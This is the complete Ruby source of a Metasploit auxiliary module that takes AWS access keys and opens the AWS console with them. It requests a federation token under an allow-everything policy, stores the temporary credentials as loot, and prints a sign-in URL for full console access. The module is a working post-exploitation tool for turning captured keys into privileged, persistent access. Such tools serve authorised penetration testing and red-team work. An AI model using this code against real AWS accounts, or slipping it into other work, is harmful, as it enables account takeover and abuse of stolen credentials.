require 'msf/core'
require 'metasploit/framework/aws/client'

class MetasploitModule < Msf::Auxiliary
  include Metasploit::Framework::Aws::Client

  def initialize(info={})
    super(update_info(info,
      'Name'           => "AWS Console",
      'Description'    => %q{
        Opens the AWS console given API access keys.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Javier Godinez <godinezj[at]gmail.com>']
    ))

    register_options(
      [
        OptString.new('AWS_STS_ENDPOINT', [true, 'AWS STS Endpoint', 'sts.amazonaws.com']),
        OptString.new('AWS_STS_ENDPOINT_PORT', [true, 'AWS STS Endpoint TCP Port', 443]),
        OptString.new('AWS_STS_ENDPOINT_SSL', [true, 'AWS STS Endpoint SSL', true]),
        OptString.new('ACCESS_KEY', [true, 'AWS access key', '']),
        OptString.new('SECRET', [true, 'AWS secret key', '']),
        OptString.new('CONSOLE_NAME', [true, 'The AWS console name', 'Metasploit']),
        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
      ], self.class)
    deregister_options('RHOST', 'RPORT', 'SSL', 'VHOST')
  end


  def run
    print_status("Generating fed token")
    action = 'GetFederationToken'
    policy = '{"Version": "2012-10-17", "Statement": [{"Action": "*","Effect": "Allow", "Resource": "*" }]}'
    datastore['RHOST'] = datastore['AWS_STS_ENDPOINT']
    datastore['RPORT'] = datastore['AWS_STS_ENDPOINT_PORT']
    datastore['SSL'] = datastore['AWS_STS_ENDPOINT_SSL']
    doc = call_sts('Action' => action, 'Name' => datastore['CONSOLE_NAME'], 'Policy' => URI.encode(policy))
    doc = print_results(doc, action)
    return if doc.nil?
    path = store_loot(datastore['ACCESS_KEY'], 'text/plain', datastore['RHOST'], doc.to_json)
    print_good("Generated temp API keys stored at: " + path)

    creds = doc.fetch('Credentials')
    session_json = {
      sessionId: creds.fetch('AccessKeyId'),
      sessionKey: creds.fetch('SecretAccessKey'),
      sessionToken: creds.fetch('SessionToken')
    }.to_json

    issuer_url = datastore['CONSOLE_NAME']
    console_url = "https://console.aws.amazon.com/"
    signin_url = "https://signin.aws.amazon.com/federation"

    get_signin_token_url = signin_url + "?Action=getSigninToken" + "&SessionType=json&Session=" + CGI.escape(session_json)
    returned_content = Net::HTTP.get(URI.parse(get_signin_token_url))
    signin_token = JSON.parse(returned_content)['SigninToken']
    signin_token_param = "&SigninToken=" + CGI.escape(signin_token)
    issuer_param = "&Issuer=" + CGI.escape(issuer_url)
    destination_param = "&Destination=" + CGI.escape(console_url)
    login_url = signin_url + "?Action=login" + signin_token_param + issuer_param + destination_param

    print_good("Paste this into your browser: #{login_url}")
  end
end